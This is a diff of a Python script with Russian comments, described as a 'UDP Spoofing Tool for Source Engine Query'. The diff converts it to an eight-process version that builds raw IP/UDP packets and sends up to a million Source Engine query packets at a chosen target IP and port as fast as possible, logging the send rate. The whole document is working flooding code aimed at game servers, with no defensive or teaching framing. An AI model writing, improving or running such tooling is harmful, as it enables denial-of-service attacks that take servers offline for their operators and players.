@@ -8,23 +8,19 @@ import random
 import time
 import errno
 import argparse
+import multiprocessing
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="UDP Spoofing Tool for Source Engine Query")
+    parser = argparse.ArgumentParser(description="UDP Spoofing Tool for Source Engine Query (Multiprocessing version)")
     parser.add_argument("target_ip", help="IP-адрес цели")
     parser.add_argument("target_port", type=int, help="Порт цели")
-    parser.add_argument("-c", "--count", type=int, default=1000000, help="Количество пакетов (по умолчанию 1 млн)")
-    parser.add_argument("--log-every", type=int, default=10000, help="Логировать каждый N-ный пакет")
-    parser.add_argument("--debug-packets", type=int, default=5, help="Сохранить первые N пакетов для диагностики")
+    parser.add_argument("-c", "--count", type=int, default=1000000, help="Общее количество пакетов (по умолчанию 1 млн)")
+    parser.add_argument("--log-every", type=int, default=10000, help="Логировать каждый N-ный пакет (вывод только для процесса 0)")
+    parser.add_argument("--debug-packets", type=int, default=5, help="Сохранить первые N пакетов для диагностики (только процесс 0)")
     return parser.parse_args()
 
 QUERY_PACKET = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
 UDP_LENGTH = 8 + len(QUERY_PACKET)  # 8 байт UDP заголовка + Payload
-
-# Создаём RAW-сокет и увеличиваем его буфер
-sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**22)  # 4 МБ
-sock.setblocking(False)
 
 # Предкомпилированные структуры для заголовков
 ip_struct = struct.Struct("!BBHHHBBH4s4s")
@@ -39,7 +35,6 @@ def checksum(data):
     return ~s & 0xffff
 
 def get_source_ip():
-    # Получаем исходный IP через соединение с удалённым сервером
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -53,13 +48,12 @@ def get_source_ip():
 def create_packet(src_ip_bin, dst_ip_bin, pseudo_header, target_port):
     total_length = 20 + UDP_LENGTH
     ip_id = random.randint(0, 65535)
-    # Формируем IP заголовок с контрольной суммой = 0
+    # Формируем IP-заголовок с контрольной суммой = 0
     ip_header = ip_struct.pack(
         0x45, 0, total_length, ip_id, 0x4000,
         64, socket.IPPROTO_UDP, 0, src_ip_bin, dst_ip_bin
     )
     ip_chksum = checksum(ip_header)
-    # Вставляем рассчитанную контрольную сумму
     ip_header = ip_header[:10] + struct.pack("!H", ip_chksum) + ip_header[12:]
     
     udp_src_port = random.randint(1024, 65535)
@@ -70,42 +64,72 @@ def create_packet(src_ip_bin, dst_ip_bin, pseudo_header, target_port):
     
     return ip_header + udp_header + QUERY_PACKET
 
-def send_packets(target_ip, target_port, packet_count, log_every, debug_packets):
-    start_time = time.time()
-    sent = 0
-    debug_dump = []
+def send_packets_process(tid, target_ip, target_port, packet_count, log_every, debug_packets, result_queue):
+    # Каждый процесс создает свой RAW-сокет
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**22)  # 4 МБ
+    sock.setblocking(False)
     
-    # Вычисляем константные значения один раз
     local_ip = get_source_ip()
     src_ip_bin = socket.inet_aton(local_ip)
     dst_ip_bin = socket.inet_aton(target_ip)
     pseudo_header = src_ip_bin + dst_ip_bin + struct.pack("!BBH", 0, socket.IPPROTO_UDP, UDP_LENGTH)
+    
+    sent = 0
+    debug_dump = []
+    start_time = time.time()
     
     for i in range(packet_count):
         packet = create_packet(src_ip_bin, dst_ip_bin, pseudo_header, target_port)
         try:
             sock.sendto(packet, (target_ip, 0))
             sent += 1
-            if sent <= debug_packets:
+            if tid == 0 and sent <= debug_packets:
                 debug_dump.append(packet)
         except OSError as e:
             if e.errno == errno.ENOBUFS:
                 time.sleep(0.001)
-            # Для остальных ошибок ничего не делаем для повышения производительности
-
-        if (i+1) % log_every == 0:
+        if tid == 0 and (i + 1) % log_every == 0:
             elapsed = time.time() - start_time
-            pps = (i+1) / elapsed if elapsed > 0 else 0
-            print(f"[INFO] {time.strftime('%H:%M:%S')} - Отправлено {i+1} пакетов, {pps:.2f} PPS.")
+            pps = (i + 1) / elapsed if elapsed > 0 else 0
+            print(f"[INFO] {time.strftime('%H:%M:%S')} [Process {tid}] - Отправлено {i+1} пакетов, {pps:.2f} PPS.")
     
     elapsed = time.time() - start_time
-    print(f"\n[RESULT] Отправлено {sent} пакетов за {elapsed:.2f} сек. ({sent/elapsed:.2f} PPS)")
-    if debug_dump:
-        print("\n[DEBUG] Hex-дамп первых пакетов:")
-        for idx, pkt in enumerate(debug_dump):
-            print(f"Пакет {idx+1}: {pkt.hex()}")
+    if tid == 0:
+        print(f"\n[PROCESS {tid} RESULT] Отправлено {sent} пакетов за {elapsed:.2f} сек. ({sent/elapsed:.2f} PPS)")
+        if debug_dump:
+            print("\n[PROCESS 0 DEBUG] Hex-дамп первых пакетов:")
+            for idx, pkt in enumerate(debug_dump):
+                print(f"Пакет {idx+1}: {pkt.hex()}")
+    result_queue.put(sent)
 
 if __name__ == "__main__":
     args = parse_args()
-    send_packets(args.target_ip, args.target_port, args.count, args.log_every, args.debug_packets)
+    num_processes = 8
+    total_packets = args.count
+    packets_per_process = total_packets // num_processes
+    # Если остаток есть, добавляем его первому процессу
+    packets_counts = [packets_per_process] * num_processes
+    packets_counts[0] += total_packets % num_processes
 
+    result_queue = multiprocessing.Queue()
+    processes = []
+    overall_start = time.time()
+    
+    for tid in range(num_processes):
+        p = multiprocessing.Process(
+            target=send_packets_process,
+            args=(tid, args.target_ip, args.target_port, packets_counts[tid], args.log_every, args.debug_packets, result_queue)
+        )
+        processes.append(p)
+        p.start()
+    
+    total_sent = 0
+    for p in processes:
+        p.join()
+    
+    while not result_queue.empty():
+        total_sent += result_queue.get()
+    
+    overall_elapsed = time.time() - overall_start
+    print(f"\n[OVERALL RESULT] Всего отправлено {total_sent} пакетов за {overall_elapsed:.2f} сек. ({total_sent/overall_elapsed:.2f} PPS)")
